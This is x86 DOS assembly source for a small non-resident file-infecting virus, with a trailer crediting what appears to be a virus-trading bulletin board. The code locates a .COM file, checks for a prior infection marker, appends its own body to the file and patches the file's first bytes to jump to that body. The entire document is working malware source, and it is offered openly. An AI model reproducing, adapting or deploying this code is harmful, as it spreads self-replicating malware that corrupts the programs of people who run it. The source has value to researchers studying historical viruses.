;****************************************************************************
;*              Mini non-resident virus
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

                .RADIX  16

FILELEN         equ     end - start
FILNAM          equ     55h


;****************************************************************************
;*              Dummy program (infected)
;****************************************************************************

                org     100h

begin:          db      0E9, 3, 0


;****************************************************************************
;*              Begin of the virus
;****************************************************************************


start:          db      0CDh,  20h, 90

                push    si                      ;si=0100

                mov     di,si
                add     si,[si+1]               ;si=0103
                push    si
                movsw
                movsb
                pop     si                      ;si -> start (buffer)

                lea     dx,[si+FILNAM]          ;dx -> filename
                mov     ah,4Eh                  ;find first file
                int     21

                mov     dx,009Eh
                mov     ax,3D02h                ;open the file
                call    int21
                jc      exit1
                xchg    bx,ax

                mov     ah,3fh                  ;read begin of file
                int     21

                cmp     byte ptr [si],0E9h      ;infected COM?
                je      exit2

                mov     al,2                    ;go to end of file
                call    seek
                xchg    ax,di

                mov     cl, low FILELEN              ;write program to end of file
                mov     ah,40h
                int     21

                mov     al,0
                call    seek
                mov     byte ptr [si], 0E9h
                mov     word ptr [si+1], di

                mov     ah,40h
                int     21

exit2:          mov     ah,3Eh                  ;close the file
                int     21

exit1:          ret

seek:           mov     ah,42
                cwd
int21:          xor     cx,cx
                int     21
                mov     cl,03
                mov     dx,si

return:         ret


;****************************************************************************
;*              Data
;****************************************************************************

filename        db      '*.COM',0

end:

cseg            ends
                end     begin

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
